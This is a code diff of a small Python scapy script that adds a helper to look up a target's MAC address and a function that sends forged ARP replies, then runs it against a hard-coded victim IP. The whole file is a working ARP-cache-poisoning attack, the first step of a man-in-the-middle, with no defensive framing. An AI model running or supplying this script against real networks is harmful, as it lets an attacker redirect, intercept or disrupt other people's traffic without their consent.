@@ -1,6 +1,16 @@
-from scapy.all import *
+import scapy.all as scapy
 
+def get_mac(ip):
+    request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="30:89:4A:D2:5A:AA")
+    final_packet = broadcast / request
+    answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
+    mac = answer[0][1].hwsrc
+    return mac
 
-def spoofing():
-    packet = scapy.ARP(op=2, hwdst="30:89:4A:D2:5A:AA", pdst="10.33.73.72", psrc="10.13.33.37", hwsrc="ad:be:ef:ca:fe")
+def spoofing(target, spoofed):
+    mac = get_mac(target)
+    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed, hwsrc="de:ad:be:ef:ca:fe")
     scapy.send(packet, verbose=False)
+
+spoofing("10.33.73.72", "10.13.33.37")
